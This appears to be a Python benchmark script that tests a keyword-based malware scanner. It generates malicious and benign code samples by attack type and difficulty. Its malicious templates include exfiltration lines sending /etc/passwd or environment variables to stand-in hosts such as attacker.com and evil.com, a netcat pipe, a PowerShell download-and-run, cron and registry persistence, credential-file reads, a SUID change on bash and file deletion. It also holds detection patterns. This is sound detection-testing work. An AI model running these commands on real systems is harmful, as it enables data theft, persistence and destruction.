#!/usr/bin/env python3
"""
Enhanced Benchmark Suite v2 - 科学测试基准
解决样本平衡、覆盖完整性、难度分级等问题
"""

import os
import sys
import json
import time
import hashlib
import argparse
import random
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Any
from datetime import datetime
from collections import Counter

# =============================================================================
# MITRE ATT&CK 完整攻击分类
# =============================================================================
ATTACK_TAXONOMY = {
    # T1xxx - 初始访问
    'initial_access': {
        'mitre': ['T1190', 'T1133', 'T1566'],
        'description': '初始访问',
        'severity': 'critical',
    },
    # T1xxx - 执行
    'execution': {
        'mitre': ['T1059', 'T1204', 'T1203', 'T1202'],
        'description': '命令执行',
        'severity': 'critical',
    },
    # T1xxx - 持久化
    'persistence': {
        'mitre': ['T1547', 'T1053', 'T1543', 'T1136', 'T1106'],
        'description': '持久化',
        'severity': 'critical',
    },
    # T1xxx - 权限提升
    'privilege_escalation': {
        'mitre': ['T1068', 'T1548', 'T1134'],
        'description': '权限提升',
        'severity': 'critical',
    },
    # T1xxx - 防御规避
    'defense_evasion': {
        'mitre': ['T1027', 'T1001', 'T1036', 'T1562', 'T1070'],
        'description': '防御规避',
        'severity': 'high',
    },
    # T1xxx - 凭证访问
    'credential_access': {
        'mitre': ['T1555', 'T1556', 'T1110', 'T1003', 'T1040'],
        'description': '凭证访问',
        'severity': 'critical',
    },
    # T1xxx - 内部探测
    'discovery': {
        'mitre': ['T1087', 'T1082', 'T1083', 'T1046', 'T1135'],
        'description': '内部探测',
        'severity': 'medium',
    },
    # T1xxx - 横向移动
    'lateral_movement': {
        'mitre': ['T1021', 'T1080', 'T1573'],
        'description': '横向移动',
        'severity': 'critical',
    },
    # T1xxx - 数据收集
    'collection': {
        'mitre': ['T1005', 'T1119', 'T1560', 'T1123'],
        'description': '数据收集',
        'severity': 'high',
    },
    # T1xxx - 数据外传
    'exfiltration': {
        'mitre': ['T1041', 'T1048', 'T1567'],
        'description': '数据外传',
        'severity': 'critical',
    },
    # T1xxx - 影响
    'impact': {
        'mitre': ['T1486', 'T1489', 'T1490', 'T1491'],
        'description': '影响破坏',
        'severity': 'high',
    },
    # T1xxx - 供应链
    'supply_chain': {
        'mitre': ['T1195', 'T1197', 'T1199'],
        'description': '供应链攻击',
        'severity': 'critical',
    },
    # 特定攻击类型 (简化名)
    'code_execution': {
        'mitre': ['T1059', 'T1204'],
        'description': '代码执行',
        'severity': 'critical',
    },
    'data_exfil': {
        'mitre': ['T1041', 'T1048'],
        'description': '数据外传',
        'severity': 'critical',
    },
    'network_call': {
        'mitre': ['T1071', 'T1132'],
        'description': '网络通信',
        'severity': 'high',
    },
    'obfuscation': {
        'mitre': ['T1027', 'T1001'],
        'description': '代码混淆',
        'severity': 'medium',
    },
    'resource_exhaustion': {
        'mitre': ['T1499', 'T1496'],
        'description': '资源耗尽',
        'severity': 'medium',
    },
    'anti_analysis': {
        'mitre': ['T1490', 'T1518'],
        'description': '反分析',
        'severity': 'medium',
    },
}

# =============================================================================
# 难度分级定义
# =============================================================================
DIFFICULTY_LEVELS = {
    'easy': {
        'description': '简单 - 明显恶意特征',
        'indicators': 3,
        'obfuscation': 0,
    },
    'medium': {
        'description': '中等 - 部分混淆',
        'indicators': 2,
        'obfuscation': 1,
    },
    'hard': {
        'description': '困难 - 完全混淆',
        'indicators': 1,
        'obfuscation': 2,
    },
}

# =============================================================================
# 恶意样本模板 (按攻击类型 + 难度)
# =============================================================================
MALICIOUS_TEMPLATES = {
    'python': {
        'code_execution': {
            'easy': [
                '''#!/usr/bin/env python3
import os
import subprocess
# Direct command execution
os.system("whoami")
subprocess.run(["ls", "-la"])
''',
                '''#!/usr/bin/env python3
import pickle
import os
# Dangerous deserialization
class Payload:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.loads(Payload())
''',
            ],
            'medium': [
                '''#!/usr/bin/env python3
import base64
# Encoded command
code = "aW1wb3J0IG9zOw=="
exec(base64.b64decode(code).decode())
''',
            ],
            'hard': [
                '''#!/usr/bin/env python3
import sys
# Obfuscated import
mod = __import__(chr(111)+chr(115))
getattr(mod, chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))('id')
''',
            ],
        },
        'data_exfil': {
            'easy': [
                '''#!/usr/bin/env python3
import socket
import os
# Direct exfiltration
data = open('/etc/passwd').read()
s = socket.socket()
s.connect(('attacker.com', 4444))
s.send(data)
s.close()
''',
            ],
            'medium': [
                '''#!/usr/bin/env python3
import requests
import os
# HTTP exfil
data = os.popen('cat /etc/hostname').read()
requests.post('https://attacker.com/c2', json={'d': data})
''',
            ],
            'hard': [
                '''#!/usr/bin/env python3
import urllib.request
import base64
# Encoded exfil with timing
def send(d):
    urllib.request.urlopen('https://attacker.com/x', data=base64.b64encode(d))
''',
            ],
        },
        'persistence': {
            'easy': [
                '''#!/usr/bin/env python3
import os
# Cron persistence
with open('/tmp/p.sh') as f:
    pass
os.system('(crontab -l;echo "@reboot python3 /tmp/p.sh")|crontab -')
''',
            ],
            'medium': [
                '''#!/usr/bin/env python3
import os
import platform
# Platform-specific persistence
if platform.system() == 'Linux':
    os.system('echo "* * * * * python3 /tmp/m.py" >> /etc/cron.d/mal')
''',
            ],
            'hard': [
                '''#!/usr/bin/env python3
import __hello__
# Import chain abuse for persistence
''',
            ],
        },
        'credential_access': {
            'easy': [
                '''#!/usr/bin/env python3
import os
# Read credential files
files = ['/etc/shadow', os.path.expanduser('~/.ssh/id_rsa')]
for f in files:
    if os.path.exists(f):
        print('Found:', f)
''',
            ],
            'medium': [
                '''#!/usr/bin/env python3
import subprocess
# Process memory credential dump
subprocess.run(['mimipython', 'out'])
''',
            ],
            'hard': [
                '''#!/usr/bin/env python3
# Hook getpass for credential interception
''',
            ],
        },
        'defense_evasion': {
            'easy': [
                '''#!/usr/bin/env python3
import base64
# Simple base64 encoding
code = 'print("malicious")'
enc = base64.b64encode(code.encode()).decode()
exec('import base64;exec(base64.b64decode("' + enc + '").decode())')
''',
            ],
            'medium': [
                '''#!/usr/bin/env python3
import zlib
# Compressed + encoded
code = 'os.system("id")'
exec(zlib.decompress(base64.b64decode(code)))
''',
            ],
            'hard': [
                '''#!/usr/bin/env python3
# Polymorphic code generation
''',
            ],
        },
        'network_call': {
            'easy': [
                '''#!/usr/bin/env python3
import socket
# Direct socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.com', 4444))
''',
            ],
            'medium': [
                '''#!/usr/bin/env python3
import urllib.request
# HTTP request
urllib.request.urlopen('https://evil.com/cmd')
''',
            ],
            'hard': [
                '''#!/usr/bin/env python3
# Covert channel using DNS
''',
            ],
        },
        'lateral_movement': {
            'easy': [
                '''#!/usr/bin/env python3
import paramiko
# SSH lateral movement
ssh = paramiko.SSHClient()
ssh.connect('target.host', username='admin', password='password')
''',
            ],
            'medium': [
                '''#!/usr/bin/env python3
import subprocess
# WMI lateral movement
subprocess.run(['wmic', '/node:TARGET', 'process', 'call', 'create'])
''',
            ],
            'hard': [
                '''#!/usr/bin/env python3
# Pass-the-hash lateral movement
''',
            ],
        },
        'supply_chain': {
            'easy': [
                '''#!/usr/bin/env python3
# Dependency confusion
import myapp_utils  # Typo-squatted package
__import__('requests')
''',
            ],
            'medium': [
                '''#!/usr/bin/env python3
# Typosquatting
import urllib3  # Similar to urllib
''',
            ],
            'hard': [
                '''#!/usr/bin/env python3
# Dependency hijacking
''',
            ],
        },
        'impact': {
            'easy': [
                '''#!/usr/bin/env python3
import os
# Data destruction
for f in os.listdir('/'):
    try:
        os.remove(f)
    except:
        pass
''',
            ],
            'medium': [
                '''#!/usr/bin/env python3
# Ransomware encryption
''',
            ],
            'hard': [
                '''#!/usr/bin/env python3
# Advanced persistence + impact
''',
            ],
        },
    },
    'javascript': {
        'code_execution': {
            'easy': [
                '''// Direct eval
eval('console.log("x")');
''',
            ],
            'medium': [
                '''// Indirect eval
(0,eval)('console.log("x")');
''',
            ],
            'hard': [
                '''// Obfuscated
''',
            ],
        },
        'data_exfil': {
            'easy': [
                '''// HTTP exfil
const https = require('https');
https.post('https://evil.com/exfil', JSON.stringify(process.env));
''',
            ],
            'medium': [
                '''// DNS exfil
''',
            ],
            'hard': [
                '''// Steganography exfil
''',
            ],
        },
        'persistence': {
            'easy': [
                '''// Startup
const fs = require('fs');
fs.writeFileSync(process.env.HOME + '/.malware.js', 'malicious code');
''',
            ],
            'medium': [
                '''// Cron
''',
            ],
            'hard': [
                '''// Package.json hijacking
''',
            ],
        },
    },
    'bash': {
        'code_execution': {
            'easy': [
                '''#!/bin/bash
# Direct command
whoami
ls -la /
''',
            ],
            'medium': [
                '''#!/bin/bash
# Piped command
echo "bash -i" | nc attacker 4444
''',
            ],
            'hard': [
                '''#!/bin/bash
# Obfuscated
''',
            ],
        },
        'data_exfil': {
            'easy': [
                '''#!/bin/bash
# Direct exfil
cat /etc/passwd | nc attacker 4444
''',
            ],
            'medium': [
                '''#!/bin/bash
# Encoded exfil
curl -X POST -d "$(base64 /etc/passwd)" https://evil.com/
''',
            ],
            'hard': [
                '''#!/bin/bash
# DNS tunneling
''',
            ],
        },
        'persistence': {
            'easy': [
                '''#!/bin/bash
# Cron
echo "@reboot $0" | crontab -
''',
            ],
            'medium': [
                '''#!/bin/bash
# systemd service
''',
            ],
            'hard': [
                '''#!/bin/bash
# Kernel module persistence
''',
            ],
        },
        'privilege_escalation': {
            'easy': [
                '''#!/bin/bash
# Sudo abuse
sudo chmod 4775 /bin/bash
''',
            ],
            'medium': [
                '''#!/bin/bash
# SUID abuse
''',
            ],
            'hard': [
                '''#!/bin/bash
# Capability exploitation
''',
            ],
        },
    },
    'powershell': {
        'code_execution': {
            'easy': [
                '''# Direct execution
IEX (New-Object Net.WebClient).DownloadString("https://evil.com/x.ps1")
''',
            ],
            'medium': [
                '''# Encoded command
''',
            ],
            'hard': [
                '''# Reflective PE injection
''',
            ],
        },
        'data_exfil': {
            'easy': [
                '''# Direct exfil
Invoke-WebRequest -Uri https://evil.com/exfil -Method POST -Body (Get-Content file.txt)
''',
            ],
            'medium': [
                '''# Encoded exfil
''',
            ],
            'hard': [
                '''# DNS exfil
''',
            ],
        },
        'persistence': {
            'easy': [
                '''# Registry
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Mal" -Value "powershell -e bad"
''',
            ],
            'medium': [
                '''# Scheduled task
''',
            ],
            'hard': [
                '''# WMI event subscription
''',
            ],
        },
    },
}

# =============================================================================
# 良性样本模板 (按真实场景分类)
# =============================================================================
BENIGN_TEMPLATES = {
    'python': {
        'utility': [
            '''#!/usr/bin/env python3
"""Utility functions"""
def add(a, b):
    return a + b

def process_data(items):
    return [x * 2 for x in items]

if __name__ == "__main__":
    print(add(1, 2))
''',
            '''#!/usr/bin/env python3
"""File processing"""
import json

def read_json(path):
    with open(path) as f:
        return json.load(f)

def write_json(path, data):
    with open(path, 'w') as f:
        json.dump(data, f)
''',
        ],
        'api': [
            '''#!/usr/bin/env python3
"""API client"""
import requests

def fetch_data(url):
    response = requests.get(url)
    return response.json()

if __name__ == "__main__":
    data = fetch_data("https://api.example.com/data")
    print(data)
''',
        ],
        'data_processing': [
            '''#!/usr/bin/env python3
"""Data processing"""
import csv

def process_csv(filepath):
    results = []
    with open(filepath) as f:
        for row in csv.DictReader(f):
            results.append(row)
    return results

def filter_data(data, key, value):
    return [x for x in data if x.get(key) == value]
''',
        ],
        'algorithm': [
            '''#!/usr/bin/env python3
"""Algorithms"""
def quicksort(arr):
    if len(arr) <= 1:
        return arr
    pivot = arr[len(arr) // 2]
    return quicksort([x for x in arr if x < pivot]) + [x for x in arr if x == pivot] + quicksort([x for x in arr if x > pivot])
''',
        ],
    },
    'javascript': {
        'utility': [
            '''// Utility functions
function add(a, b) { return a + b; }
function process(items) { return items.map(x => x * 2); }
''',
        ],
        'api': [
            '''// API client
const fetch = require('node-fetch');
async function getData(url) {
  const res = await fetch(url);
  return res.json();
}
''',
        ],
    },
    'bash': {
        'utility': [
            '''#!/bin/bash
# File utility
echo "Processing files..."
for f in *.txt; do
    echo "Processing $f"
done
''',
            '''#!/bin/bash
# System info
echo "Hostname: $(hostname)"
echo "User: $(whoami)"
''',
        ],
    },
    'powershell': {
        'utility': [
            '''# Utility functions
function Get-Sum($a, $b) { $a + $b }
function Process-Data($items) { $items | ForEach-Object { $_ * 2 } }
''',
            '''# System info
Get-Process | Select-Object Name, CPU
Get-Date
''',
        ],
    },
}


@dataclass
class Sample:
    """测试样本"""
    id: str
    language: str
    category: str  # malicious / benign
    attack_type: Optional[str]
    difficulty: str  # easy / medium / hard
    code: str
    severity: str
    mitre_techniques: List[str]
    hash: str
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class BenchmarkResult:
    """基准测试结果"""
    total_samples: int
    malicious_samples: int
    benign_samples: int
    detected_malicious: int
    false_positives: int
    detection_rate: float
    false_positive_rate: float
    precision: float
    recall: float
    f1_score: float
    by_attack_type: Dict[str, Dict]
    by_difficulty: Dict[str, Dict]
    by_language: Dict[str, Dict]
    timestamp: str


class EnhancedSampleGenerator:
    """增强版样本生成器"""
    
    def __init__(self, output_dir: str = "benchmark_samples_v2"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.samples = {'malicious': [], 'benign': []}
    
    def generate_malicious(
        self,
        language: str,
        attack_type: str,
        difficulty: str = 'easy',
        count: int = 3
    ) -> List[Sample]:
        """生成恶意样本"""
        samples = []
        
        # 获取模板
        lang_templates = MALICIOUS_TEMPLATES.get(language, {})
        at_templates = lang_templates.get(attack_type, {})
        templates = at_templates.get(difficulty, at_templates.get('easy', []))
        
        if not templates:
            return samples
        
        attack_info = ATTACK_TAXONOMY.get(attack_type, {})
        
        for i in range(count):
            template = templates[i % len(templates)] if templates else ""
            sample = Sample(
                id=f"{language}_{attack_type}_{difficulty}_{i:03d}",
                language=language,
                category="malicious",
                attack_type=attack_type,
                difficulty=difficulty,
                code=template,
                severity=attack_info.get('severity', 'medium'),
                mitre_techniques=attack_info.get('mitre', []),
                hash=hashlib.md5(template.encode()).hexdigest()[:12] if template else "empty",
                metadata={"difficulty": difficulty}
            )
            samples.append(sample)
        
        return samples
    
    def generate_benign(
        self,
        language: str,
        category: str = 'utility',
        count: int = 3
    ) -> List[Sample]:
        """生成良性样本"""
        samples = []
        
        templates = BENIGN_TEMPLATES.get(language, {}).get(category, [])
        if not templates:
            templates = list(BENIGN_TEMPLATES.get('python', {}).values())[0]
        
        for i in range(count):
            template = templates[i % len(templates)]
            sample = Sample(
                id=f"{language}_benign_{category}_{i:03d}",
                language=language,
                category="benign",
                attack_type=None,
                difficulty="n/a",
                code=template,
                severity="none",
                mitre_techniques=[],
                hash=hashlib.md5(template.encode()).hexdigest()[:12],
                metadata={"category": category}
            )
            samples.append(sample)
        
        return samples
    
    def generate_full_dataset(self, balanced: bool = True) -> Dict[str, List[Sample]]:
        """生成完整测试数据集"""
        print("Generating enhanced benchmark dataset...")
        
        all_samples = {'malicious': [], 'benign': []}
        
        # 1. 恶意样本 - 覆盖所有攻击类型和难度
        for lang in MALICIOUS_TEMPLATES.keys():
            for attack_type in MALICIOUS_TEMPLATES[lang].keys():
                for difficulty in ['easy', 'medium', 'hard']:
                    samples = self.generate_malicious(lang, attack_type, difficulty, count=3)
                    all_samples['malicious'].extend(samples)
        
        # 2. 良性样本 - 多种真实场景
        for lang in ['python', 'javascript', 'bash', 'powershell']:
            for category in ['utility', 'api', 'data_processing', 'algorithm']:
                samples = self.generate_benign(lang, category, count=5)
                all_samples['benign'].extend(samples)
        
        # 3. 平衡处理
        if balanced:
            mal_count = len(all_samples['malicious'])
            ben_count = len(all_samples['benign'])
            
            print(f"  Before balance: Malicious={mal_count}, Benign={ben_count}")
            
            # 目标比例 3:1 (更合理的测试比例)
            target_ben = min(ben_count, mal_count // 3)
            
            if ben_count > target_ben:
                all_samples['benign'] = all_samples['benign'][:target_ben]
            elif ben_count < target_ben:
                # 复制更多良性样本
                needed = target_ben - ben_count
                current = all_samples['benign'][:]
                while len(all_samples['benign']) < target_ben:
                    all_samples['benign'].extend(current[:min(needed, len(current))])
            
            print(f"  After balance: Malicious={len(all_samples['malicious'])}, Benign={len(all_samples['benign'])}")
        
        return all_samples
    
    def save_samples(self, samples: List[Sample]) -> None:
        """保存样本"""
        for sample in samples:
            cat_dir = self.output_dir / sample.category / sample.language
            cat_dir.mkdir(parents=True, exist_ok=True)
            
            ext = {'python': 'py', 'javascript': 'js', 'bash': 'sh', 'powershell': 'ps1'}.get(sample.language, 'txt')
            filepath = cat_dir / f"{sample.id}.{ext}"
            filepath.write_text(sample.code)
            
            # 保存元数据
            meta = {
                'id': sample.id,
                'language': sample.language,
                'category': sample.category,
                'attack_type': sample.attack_type,
                'difficulty': sample.difficulty,
                'severity': sample.severity,
                'mitre_techniques': sample.mitre_techniques,
            }
            (filepath.with_suffix('.json')).write_text(json.dumps(meta, indent=2))


class EnhancedScanner:
    """增强版扫描器"""
    
    def __init__(self):
        self.rules = self._load_rules()
    
    def _load_rules(self) -> Dict[str, List[str]]:
        return {
            'critical': [
                'eval(', 'exec(', '__import__', 'pickle.loads', 'eval(',
                'socket.socket', 'connect((', 'socket.AF_INET',
                'child_process', 'execSync', 'eval(',
                'IEX(', 'Invoke-Expression', 'Net.WebClient',
                'paramiko.SSHClient', 'CreateRemoteThread',
            ],
            'high': [
                'os.system', 'subprocess.run', 'subprocess.Popen', 'subprocess.call',
                'requests.post', 'requests.get', 'http.request', 'urllib.request',
                'os.popen', 'popen(', 'system(',
                'Invoke-WebRequest', 'Invoke-RestMethod', 'WebClient',
                'base64.b64decode', 'base64.b64encode',
                'crontab', '@reboot', 'cron.',
                'Set-ItemProperty', 'HKCU:', 'HKLM:',
            ],
            'medium': [
                'zlib', 'gzip', 'compress', 'zipfile',
                'curl ', 'wget ', 'nc ', 'netcat',
                'whoami', 'hostname', 'uname',
                'chmod 4775', 'chmod 4755', 'SUID',
                'RSAEncrypt', 'CryptEncrypt',
                'CreateObject', 'ComObject',
            ],
        }
    
    def scan(self, code: str) -> tuple:
        indicators = []
        score = 0.0
        
        for level, patterns in self.rules.items():
            for pattern in patterns:
                if pattern.lower() in code.lower():
                    indicators.append(f"{level}:{pattern}")
                    if level == 'critical':
                        score += 0.3
                    elif level == 'high':
                        score += 0.2
                    elif level == 'medium':
                        score += 0.1
        
        score = min(score, 1.0)
        is_malicious = score >= 0.2
        
        return is_malicious, score, indicators


class EnhancedBenchmarkRunner:
    """增强版基准测试运行器"""
    
    def __init__(self):
        self.scanner = EnhancedScanner()
        self.generator = EnhancedSampleGenerator()
    
    def run(self) -> BenchmarkResult:
        # 生成样本
        all_samples = self.generator.generate_full_dataset(balanced=True)
        samples = all_samples['malicious'] + all_samples['benign']
        
        # 扫描
        results = []
        for sample in samples:
            is_malicious, score, indicators = self.scanner.scan(sample.code)
            results.append({
                'sample': sample,
                'detected': is_malicious,
                'score': score,
                'indicators': indicators,
            })
        
        # 统计
        malicious = [r for r in results if r['sample'].category == 'malicious']
        benign = [r for r in results if r['sample'].category == 'benign']
        
        detected_mal = len([r for r in malicious if r['detected']])
        fp = len([r for r in benign if r['detected']])
        
        mal_total = len(malicious)
        ben_total = len(benign)
        
        det_rate = detected_mal / mal_total if mal_total > 0 else 0
        fp_rate = fp / ben_total if ben_total > 0 else 0
        
        precision = detected_mal / (detected_mal + fp) if (detected_mal + fp) > 0 else 0
        recall = det_rate
        f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0
        
        # 按攻击类型
        by_at = {}
        for at in set(r['sample'].attack_type for r in malicious if r['sample'].attack_type):
            at_samples = [r for r in malicious if r['sample'].attack_type == at]
            detected = len([r for r in at_samples if r['detected']])
            by_at[at] = {'total': len(at_samples), 'detected': detected, 'rate': detected/len(at_samples)}
        
        # 按难度
        by_diff = {}
        for diff in ['easy', 'medium', 'hard']:
            diff_samples = [r for r in malicious if r['sample'].difficulty == diff]
            if diff_samples:
                detected = len([r for r in diff_samples if r['detected']])
                by_diff[diff] = {'total': len(diff_samples), 'detected': detected, 'rate': detected/len(diff_samples)}
        
        # 按语言
        by_lang = {}
        for lang in set(r['sample'].language for r in results):
            lang_samples = [r for r in results if r['sample'].language == lang]
            mal = [r for r in lang_samples if r['sample'].category == 'malicious']
            ben = [r for r in lang_samples if r['sample'].category == 'benign']
            mal_det = len([r for r in mal if r['detected']])
            ben_fp = len([r for r in ben if r['detected']])
            by_lang[lang] = {
                'malicious': {'total': len(mal), 'detected': mal_det},
                'benign': {'total': len(ben), 'false_positives': ben_fp}
            }
        
        return BenchmarkResult(
            total_samples=len(results),
            malicious_samples=mal_total,
            benign_samples=ben_total,
            detected_malicious=detected_mal,
            false_positives=fp,
            detection_rate=det_rate,
            false_positive_rate=fp_rate,
            precision=precision,
            recall=recall,
            f1_score=f1,
            by_attack_type=by_at,
            by_difficulty=by_diff,
            by_language=by_lang,
            timestamp=datetime.now().isoformat(),
        )
    
    def print_report(self, result: BenchmarkResult) -> None:
        print("\n" + "="*70)
        print("📊 ENHANCED BENCHMARK RESULTS v2")
        print("="*70)
        
        print(f"\n{'='*50}")
        print("OVERALL METRICS")
        print(f"{'='*50}")
        print(f"  Total Samples:     {result.total_samples}")
        print(f"  Malicious:        {result.malicious_samples} ({result.malicious_samples/result.total_samples*100:.1f}%)")
        print(f"  Benign:            {result.benign_samples} ({result.benign_samples/result.total_samples*100:.1f}%)")
        print(f"\n  Detection Rate:   {result.detection_rate*100:.1f}%")
        print(f"  False Positive:   {result.false_positive_rate*100:.1f}%")
        print(f"  Precision:        {result.precision*100:.1f}%")
        print(f"  Recall:           {result.recall*100:.1f}%")
        print(f"  F1 Score:         {result.f1_score*100:.1f}%")
        
        print(f"\n{'='*50}")
        print("BY DIFFICULTY")
        print(f"{'='*50}")
        for diff, stats in result.by_difficulty.items():
            print(f"  {diff:8}: {stats['detected']:3}/{stats['total']:3} = {stats['rate']*100:5.1f}%")
        
        print(f"\n{'='*50}")
        print("BY ATTACK TYPE")
        print(f"{'='*50}")
        for at, stats in sorted(result.by_attack_type.items()):
            desc = ATTACK_TAXONOMY.get(at, {}).get('description', at)
            print(f"  {at:20} ({desc:15}): {stats['detected']:3}/{stats['total']:3} = {stats['rate']*100:5.1f}%")
        
        print(f"\n{'='*50}")
        print("BY LANGUAGE")
        print(f"{'='*50}")
        for lang, stats in result.by_language.items():
            mal = stats['malicious']
            ben = stats['benign']
            mal_rate = mal['detected']/mal['total']*100 if mal['total'] > 0 else 0
            fp_rate = ben['false_positives']/ben['total']*100 if ben['total'] > 0 else 0
            print(f"  {lang:12}: Mal {mal['detected']:2}/{mal['total']:2} ({mal_rate:5.1f}%) | Ben FP {ben['false_positives']:2}/{ben['total']:2} ({fp_rate:5.1f}%)")
        
        print("\n" + "="*70)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--generate', action='store_true')
    parser.add_argument('--run', action='store_true')
    parser.add_argument('--output', default='benchmark_samples_v2')
    args = parser.parse_args()
    
    runner = EnhancedBenchmarkRunner()
    
    if args.generate:
        all_samples = runner.generator.generate_full_dataset(balanced=True)
        for cat, samples in all_samples.items():
            runner.generator.save_samples(samples)
        print(f"Generated {sum(len(s) for s in all_samples.values())} samples")
    
    if args.run or not args.generate:
        result = runner.run()
        runner.print_report(result)
        
        # 保存
        result_file = f"benchmark_result_v2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(result_file, 'w') as f:
            json.dump(asdict(result), f, indent=2, default=str)
        print(f"\nResults saved to {result_file}")


if __name__ == '__main__':
    main()
